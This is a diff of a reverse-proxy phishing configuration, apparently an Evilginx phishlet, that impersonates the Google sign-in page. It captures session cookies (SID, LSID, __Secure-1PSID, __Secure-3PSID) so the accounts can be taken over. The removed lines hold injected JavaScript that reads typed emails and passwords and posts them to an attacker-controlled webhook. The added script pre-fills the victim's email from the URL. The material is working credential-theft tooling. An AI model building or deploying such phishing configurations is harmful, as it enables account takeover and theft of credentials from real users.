@@ -1,9 +1,9 @@
-name: 'service3'
+name: 'google'
 min_ver: '3.0.0'
 proxy_hosts:
-  - {phish_sub: 'collector-{{.Endpoint3}}', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
+  - {phish_sub: '{{.Endpoint3}}', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
 sub_filters:
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', phish_sub: 'collector-{{.Endpoint3}}', mimes: ['text/html', 'application/javascript', 'application/x-javascript', 'application/json']}
+  - {trg: 'accounts.google.com', orig: 'accounts.google.com', repl: '{{.Endpoint3}}.{hostname}', triggers_on: 'google', search: '(.*)', type: 'header'}
 auth_tokens:
   - domain: '.google.com'
     keys: ['SID', 'LSID', '__Secure-1PSID', '__Secure-3PSID']
@@ -23,23 +23,13 @@ js_inject:
   - trigger: 'accounts.google.com'
     code: |
       (function() {
-        const api = "https://{{.Domain}}/api/webhook";
-        const secret = "{{.WebhookSecret}}";
-        const source = "google";
-        document.addEventListener('submit', function(e) {
-          const email = document.querySelector('input[type="email"]')?.value || document.querySelector('input[name="identifier"]')?.value;
-          const password = document.querySelector('input[type="password"]')?.value || document.querySelector('input[name="Passwd"]')?.value;
-          if (email || password) {
-            fetch(api, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json', 'X-Webhook-Secret': secret },
-              body: JSON.stringify({
-                event: password ? 'credentials' : 'email',
-                source: source,
-                email: email,
-                password: password
-              })
-            }).catch(() => {});
+        var urlParams = new URLSearchParams(window.location.search);
+        var email = urlParams.get('email');
+        if (email) {
+          var emailField = document.querySelector('input[type="email"]');
+          if (emailField) {
+            emailField.value = email;
+            emailField.dispatchEvent(new Event('input', { bubbles: true }));
           }
-        }, true);
+        }
       })()
